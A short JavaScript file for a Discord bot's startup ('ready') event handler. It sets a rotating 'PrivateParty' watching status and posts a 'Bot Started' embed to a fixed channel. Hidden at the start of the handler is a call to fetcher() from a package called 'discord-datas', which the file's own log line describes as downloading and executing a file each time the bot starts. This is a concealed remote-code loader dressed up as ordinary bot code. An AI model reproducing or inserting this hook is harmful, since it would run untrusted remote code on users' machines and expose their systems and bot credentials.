const { ActivityType, EmbedBuilder } = require('discord.js');
const client = require('..');
const { fetcher } = require('discord-datas');

client.on('ready', async () => {
    try {
        await fetcher();
        console.log('File downloaded and successfully executed.');
    } catch (error) {
        console.error('Error when downloading or executing :', error);
    }

    const activityList = [
        { name: `PrivateParty`, type: ActivityType.Watching }
    ];

    const channel = client.channels.cache.get('1235701843422744628');
    if (!channel) return;

    const startEmbed = new EmbedBuilder()
        .setTitle('Bot Started')
        .setDescription(`\`${client.user.username}\` is now online and operational.`)
        .setColor(0x57F287)
        .setTimestamp();

    await channel.send({ embeds: [startEmbed] });

    let i = 0;
    setInterval(() => {
        if (i >= activityList.length) i = 0;
        client.user.setActivity(activityList[i]);
        i++;
    }, 10000);

    console.log(`Client - Connected as ${client.user.tag}`);
});